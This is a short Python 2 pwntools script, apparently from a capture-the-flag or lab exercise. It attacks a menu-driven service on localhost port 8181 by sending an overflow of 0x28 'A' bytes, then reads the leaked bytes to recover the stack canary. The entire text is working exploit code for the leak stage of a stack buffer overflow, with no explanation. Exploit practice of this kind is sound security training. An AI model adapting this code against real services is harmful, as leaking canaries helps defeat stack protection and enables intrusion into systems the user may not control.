from pwn import *

payload = "A"*0x28

s = connect("0", 8181)
s.recv()
s.sendline("1")
s.recv()
s.sendline(payload)
leaked = s.recv()
canary = u32("\x00"+leaked[-3:])
print "canary leak : "+str(hex(canary))
s.close()

